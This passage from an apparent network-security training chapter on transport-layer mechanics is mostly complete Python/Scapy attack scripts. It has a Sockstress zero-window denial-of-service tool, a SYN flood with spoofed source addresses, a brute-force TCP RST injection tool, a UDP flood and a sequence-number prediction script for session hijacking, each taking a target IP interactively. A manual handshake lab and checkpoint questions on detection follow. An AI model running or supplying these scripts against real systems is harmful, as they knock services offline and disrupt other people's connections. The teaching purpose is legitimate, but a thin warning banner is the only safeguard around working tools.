                    window=0  # Zero window!
                )
                send(ack, verbose=0)
                
                self.connections.append({
                    'sport': sport,
                    'seq': 1001,
                    'ack': syn_ack[TCP].seq+1
                })
                
                return True
        
        return False
    
    def maintain_connections(self):
        """
        Send periodic window updates to keep connections alive
        """
        while self.running:
            for conn in self.connections:
                # Send ACK with window=0 to keep connection alive
                keepalive = IP(dst=self.target)/TCP(
                    sport=conn['sport'],
                    dport=self.port,
                    flags="A",
                    seq=conn['seq'],
                    ack=conn['ack'],
                    window=0
                )
                send(keepalive, verbose=0)
            
            time.sleep(10)  # Every 10 seconds
    
    def attack(self, num_connections=100):
        """
        Launch sockstress attack
        """
        print(f"[*] Sockstress Attack")
        print(f"    Target: {self.target}:{self.port}")
        print(f"    Connections: {num_connections}")
        
        # Start keepalive thread
        keepalive_thread = threading.Thread(target=self.maintain_connections)
        keepalive_thread.daemon = True
        keepalive_thread.start()
        
        # Create connections
        print(f"\n[*] Creating connections...")
        for i in range(num_connections):
            if self.create_connection():
                print(f"    [{i+1}/{num_connections}] Connection established")
            else:
                print(f"    [{i+1}/{num_connections}] Failed")
            
            time.sleep(0.1)
        
        print(f"\n[+] Attack complete!")
        print(f"[*] {len(self.connections)} connections established")
        print(f"[*] Server resources exhausted")
        print(f"[*] Press Ctrl+C to stop")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n[*] Stopping attack...")

# Example (DO NOT USE AGAINST REAL TARGETS)
if __name__ == "__main__":
    print("[!] WARNING: This is for educational purposes only!")
    print("[!] Unauthorized use is illegal!\n")
    
    confirm = input("Type 'I UNDERSTAND' to continue: ")
    if confirm != "I UNDERSTAND":
        print("Exiting...")
        exit()
    
    target = input("[?] Target IP: ")
    port = int(input("[?] Target port: "))
    num_conn = int(input("[?] Number of connections (default: 100): ") or "100")
    
    attack = SockstressAttack(target, port)
    attack.attack(num_conn)
```

---

## 8. Practical Lab: Manual Handshakes with Scapy

Don't just trust Nmap. Build the packet yourself using Python Scapy.

### 8.1 Manual TCP Handshake

```python
#!/usr/bin/env python3
"""
Manual TCP 3-Way Handshake
"""

from scapy.all import *

def manual_handshake(target_ip, target_port):
    """
    Perform manual 3-way handshake
    """
    print(f"[*] Manual TCP Handshake: {target_ip}:{target_port}\n")
    
    # Step 1: Send SYN
    print("[1] Sending SYN...")
    src_port = random.randint(10000, 65535)
    seq_num = random.randint(1000, 9999)
    
    syn = IP(dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="S", seq=seq_num)
    syn_ack = sr1(syn, timeout=2, verbose=0)
    
    if not syn_ack or not syn_ack.haslayer(TCP):
        print("[!] No response - port filtered or closed")
        return
    
    if syn_ack[TCP].flags == 0x12:  # SYN-ACK
        print(f"[+] Received SYN-ACK")
        print(f"    Server Seq: {syn_ack[TCP].seq}")
        print(f"    Server Ack: {syn_ack[TCP].ack}")
        
        # Step 2: Send ACK
        print("\n[2] Sending ACK...")
        ack = IP(dst=target_ip)/TCP(
            sport=src_port,
            dport=target_port,
            flags="A",
            seq=syn_ack[TCP].ack,
            ack=syn_ack[TCP].seq + 1
        )
        send(ack, verbose=0)
        
        print("[+] Connection ESTABLISHED!")
        
        # Step 3: Send data (optional)
        choice = input("\n[?] Send HTTP GET request? (y/n): ")
        if choice.lower() == 'y':
            print("\n[3] Sending HTTP GET...")
            http_get = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n"
            push = IP(dst=target_ip)/TCP(
                sport=src_port,
                dport=target_port,
                flags="PA",  # PSH + ACK
                seq=syn_ack[TCP].ack,
                ack=syn_ack[TCP].seq + 1
            )/http_get
            
            response = sr1(push, timeout=2, verbose=0)
            
            if response and response.haslayer(Raw):
                print("[+] Received HTTP response:")
                print(response[Raw].load.decode(errors='ignore')[:500])
        
        # Step 4: Close connection
        print("\n[4] Closing connection (FIN)...")
        fin = IP(dst=target_ip)/TCP(
            sport=src_port,
            dport=target_port,
            flags="FA",
            seq=syn_ack[TCP].ack + len(http_get) if 'http_get' in locals() else syn_ack[TCP].ack,
            ack=syn_ack[TCP].seq + 1
        )
        send(fin, verbose=0)
        print("[+] Connection closed")
    
    elif syn_ack[TCP].flags == 0x14:  # RST-ACK
        print("[-] Received RST-ACK - port closed")

# Example usage
if __name__ == "__main__":
    target = input("[?] Target IP: ")
    port = int(input("[?] Target port: "))
    
    manual_handshake(target, port)
```

### 8.2 Sequence Number Prediction

```python
#!/usr/bin/env python3
"""
TCP Sequence Number Prediction
For session hijacking research
"""

from scapy.all import *

def predict_sequence(target, port, samples=10):
    """
    Predict TCP sequence numbers
    """
    print(f"[*] Analyzing sequence numbers: {target}:{port}")
    
    sequences = []
    
    for i in range(samples):
        syn = IP(dst=target)/TCP(dport=port, flags="S")
        syn_ack = sr1(syn, timeout=1, verbose=0)
        
        if syn_ack and syn_ack.haslayer(TCP):
            seq = syn_ack[TCP].seq
            sequences.append(seq)
            print(f"    Sample {i+1}: {seq}")
            
            # Send RST to close
            send(IP(dst=target)/TCP(dport=port, flags="R"), verbose=0)
        
        time.sleep(0.5)
    
    if len(sequences) > 1:
        # Calculate differences
        diffs = [sequences[i+1] - sequences[i] for i in range(len(sequences)-1)]
        avg_diff = sum(diffs) / len(diffs)
        
        print(f"\n[*] Analysis:")
        print(f"    Average increment: {avg_diff:.0f}")
        print(f"    Min: {min(diffs)}, Max: {max(diffs)}")
        
        if max(diffs) - min(diffs) < 1000:
            print(f"[!] Highly predictable! (Vulnerable)")
        elif avg_diff < 100000:
            print(f"[!] Somewhat predictable")
        else:
            print(f"[+] Good randomization")

# Example
if __name__ == "__main__":
    target = input("[?] Target IP: ")
    port = int(input("[?] Target port: "))
    
    predict_sequence(target, port)
```

---

## 9. Advanced TCP Attacks

### 9.1 SYN Flood Attack

```python
#!/usr/bin/env python3
"""
SYN Flood Attack
Exhausts server connection queue
"""

from scapy.all import *
import random

def syn_flood(target, port, duration=60):
    """
    SYN flood attack
    """
    print(f"[*] SYN Flood Attack")
    print(f"    Target: {target}:{port}")
    print(f"    Duration: {duration} seconds")
    
    start_time = time.time()
    count = 0
    
    while time.time() - start_time < duration:
        # Random source IP
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        
        # Random source port
        src_port = random.randint(1024, 65535)
        
        # Random sequence
        seq = random.randint(1, 2**32)
        
        # Send SYN
        syn = IP(src=src_ip, dst=target)/TCP(sport=src_port, dport=port, flags="S", seq=seq)
        send(syn, verbose=0)
        
        count += 1
        
        if count % 100 == 0:
            print(f"\r[*] Packets sent: {count}", end="")
    
    print(f"\n[+] Attack complete: {count} SYN packets sent")

# Example
if __name__ == "__main__":
    target = input("[?] Target IP: ")
    port = int(input("[?] Target port: "))
    
    syn_flood(target, port)
```

### 9.2 RST Injection (Connection Killing)

```python
#!/usr/bin/env python3
"""
TCP RST Injection
Kill active TCP connections
"""

from scapy.all import *

def kill_connection(src_ip, dst_ip, src_port, dst_port):
    """
    Inject RST to kill connection
    """
    print(f"[*] Killing connection:")
    print(f"    {src_ip}:{src_port} <-> {dst_ip}:{dst_port}")
    
    # Need to predict or sniff the sequence number
    # For demo, we'll send multiple RSTs with seq guesses
    
    for seq in range(0, 2**32, 10000):
        rst = IP(src=src_ip, dst=dst_ip)/TCP(
            sport=src_port,
            dport=dst_port,
            flags="R",
            seq=seq
        )
        send(rst, verbose=0)
        
        if seq % 1000000 == 0:
            print(f"    Tried {seq:,} sequence numbers...")
    
    print(f"[+] RST injection complete")

# Example
if __name__ == "__main__":
    print("[*] TCP RST Injection Tool")
    src_ip = input("[?] Source IP: ")
    dst_ip = input("[?] Destination IP: ")
    src_port = int(input("[?] Source port: "))
    dst_port = int(input("[?] Destination port: "))
    
    kill_connection(src_ip, dst_ip, src_port, dst_port)
```

---

## 10. UDP-Based Attacks

### 10.1 UDP Flood

```python
#!/usr/bin/env python3
"""
UDP Flood Attack
"""

from scapy.all import *
import random

def udp_flood(target, duration=60):
    """
    UDP flood to random ports
    """
    print(f"[*] UDP Flood: {target}")
    
    start_time = time.time()
    count = 0
    
    while time.time() - start_time < duration:
        # Random port
        port = random.randint(1, 65535)
        
        # Random payload
        payload = "X" * random.randint(100, 1000)
        
        # Send UDP
        packet = IP(dst=target)/UDP(dport=port)/payload
        send(packet, verbose=0)
        
        count += 1
        
        if count % 100 == 0:
            print(f"\r[*] Packets sent: {count}", end="")
    
    print(f"\n[+] Flood complete: {count} packets")

# Example
if __name__ == "__main__":
    target = input("[?] Target IP: ")
    udp_flood(target)
```

---

## 15. Critical Analysis & Checkpoints

### 15.1 The "Reset" Gun (Censorship)

Deep Packet Inspection (DPI) systems (like the Great Firewall of China) monitor the initial HTTP GET packet. If they see a banned keyword, they forge a **TCP RST** packet.

- They send a RST to the Client (spoofing the Server).
- They send a RST to the Server (spoofing the Client).
- **Result**: The connection tears down immediately.

### 15.2 Checkpoint Questions

1.  **Nmap**: Why does Nmap report "Open|Filtered" for UDP?
    -   *Answer*: Because an Open UDP port usually drops the packet (application consumes it) and a Filtered port drops the packet (firewall consumes it). Silence is ambiguous.

2.  **Flags**: What happens if you send a SYN packet to an established connection?
    -   *Answer*: The receiver is confused (State: ESTABLISHED, Recv: SYN). It usually sends an ACK (re-confirming current state). It allows for "TCP Resynchronization".

3.  **Performance**: Why is UDP preferred for streaming?
    -   *Answer*: TCP's retransmission logic causes "Buffering" pauses. UDP just skips the lost frame, causing a minor glitch/artifact, which is better for real-time video.

4.  **Security**: Why is SYN flood effective?
    -   *Answer*: Server allocates resources (memory, connection queue) for each SYN. Attacker sends thousands with spoofed IPs, exhausting server resources. Server can't complete handshakes or accept legitimate connections.

5.  **Detection**: How can you detect port scanning?
    -   *Answer*: Monitor for:
      - Many SYN packets to different ports from same source
      - Unusual flag combinations (NULL, XMAS, FIN)
      - High rate of connection attempts
      - Connections that never complete (SYN scan)

### 15.3 Interview Questions

**Q**: What's the difference between half-open and full-open scanning?
- **A**: Half-open (SYN scan) sends SYN, receives SYN-ACK, then RST - never completes handshake. Full-open (Connect scan) completes 3-way handshake. Half-open is stealthier but requires root.

**Q**: Why set TCP window to zero in Sockstress?
- **A**: Tells server "I can't receive data" so server holds data in buffer, keeping connection and resources allocated. Multiply by thousands of connections = DoS.

**Q**: How does OS fingerprinting work with TCP?
- **A**: Different OSes have different defaults (TTL, window size, TCP options, responses to malformed packets). Nmap sends unusual packets and analyzes responses to identify OS.

### 15.4 Final Thoughts

TCP is the polite conversationalist; UDP is the shouting town crier. Security tools rely heavily on the predictability of the TCP state machine. By manipulating this state (sending flags out of order), you can often confuse IDS/IPS systems or map invisible networks.

---

*End of Chapter: Transport Layer Mechanics*

